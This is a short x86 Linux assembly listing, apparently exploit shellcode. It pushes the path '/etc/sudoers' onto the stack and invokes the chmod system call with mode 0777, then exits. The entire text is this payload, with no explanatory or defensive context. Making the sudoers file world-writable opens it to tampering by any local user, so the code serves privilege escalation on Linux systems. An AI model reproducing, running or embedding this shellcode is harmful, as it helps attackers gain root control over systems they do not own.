global _start
 
section .text
 
_start:
 
    cdq			; edx to 0
    push edx		; terminating NULL
    push 0x7372656f	; 'sreo'
    push 0x6475732f	; 'dus/'
    push 0x6374652f	; 'cte/'
    mov ebx, esp	; point ebx to stack
    mov cx, 0x1ff	; 777
    push 0xf		; chmod()
    pop eax		
    int 0x80		; execute chmod()
    push 0x1		; exit()
    pop eax
    int 0x80		; execute exit()

